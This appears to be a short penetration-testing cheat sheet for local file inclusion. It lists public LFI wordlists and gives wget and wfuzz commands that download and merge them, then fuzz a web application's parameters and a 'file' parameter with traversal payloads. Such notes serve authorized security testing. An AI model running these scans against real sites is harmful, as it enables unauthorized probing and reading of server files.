Wordlists:
```
https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux
https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows
https://github.com/whiteknight7/wordlist/blob/main/windows_LFI.txt
https://github.com/drtychai/wordlists/blob/master/intruder/lfi.txt
https://github.com/whiteknight7/wordlist/blob/main/linux_LFI.txt
```

```
mkdir LFI
cd LFI

# Parameters:
wget https://raw.githubusercontent.com/whiteknight7/wordlist/refs/heads/main/fuzz-lfi-params-list.txt
wfuzz -hc=404 -t 5 -w ./fuzz-lfi-params-list.txt https://test.com/path/?FUZZ=index.html

# attack
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt&
wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/refs/heads/main/LFI-WordList-Linux&
wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/refs/heads/main/LFI-WordList-Windows&
wget https://raw.githubusercontent.com/drtychai/wordlists/refs/heads/master/intruder/lfi.txt&
wget https://raw.githubusercontent.com/whiteknight7/wordlist/refs/heads/main/linux_LFI.txt&
wget https://raw.githubusercontent.com/whiteknight7/wordlist/refs/heads/main/windows_LFI.txt&
rm wget-log*

cat * | sort -u > LFI.txt

wfuzz -hc=404 -t 5 -w LFI.txt https://test.com/path/?file=FUZZ
```